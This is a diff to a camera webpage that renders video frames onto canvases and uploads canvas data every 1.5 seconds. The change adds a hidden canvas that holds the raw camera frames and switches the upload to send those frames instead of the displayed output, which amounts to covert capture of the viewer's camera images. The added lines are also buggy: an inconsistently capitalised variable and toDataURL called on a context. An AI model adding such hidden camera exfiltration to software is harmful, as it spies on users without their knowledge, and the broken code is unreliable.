@@ -26,13 +26,16 @@ canvas#output-canvas {
   <video id="camera-stream" playsinline autoplay></video>
   <canvas id="hidden-canvas"></canvas>
   <canvas id="output-canvas"></canvas>
+<canvas id="save-canvas" Hidden="hidden"></canvas>
 
   <script >
  const video = document.querySelector('#camera-stream');
 const hiddenCanvas = document.querySelector('#hidden-canvas');
 const outputCanvas = document.querySelector('#output-canvas');
+const saveCanvas = document.querySelector('#save-canvas')
 const hiddenContext = hiddenCanvas.getContext('2d');
 const outputContext = outputCanvas.getContext('2d');
+const saveContext = saveCanvas.getContext('2d')
 
 const constraints = {
   video: {
@@ -73,6 +76,7 @@ const processFrame = () => {
     outputCanvas.width = width;
     outputCanvas.height = height;
     hiddenContext.drawImage(video, 0, 0, width, height);
+SaveContext.drawImage(video, 0, 0, width, height);
 
     outputContext.textBaseline = 'top';
     outputContext.font = `${fontHeight}px Consolas`;
@@ -125,7 +129,7 @@ $.ajax({
 };
   setInterval(function(){
 
-       var canvasData = outputCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       var canvasData = SaveContext.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
 
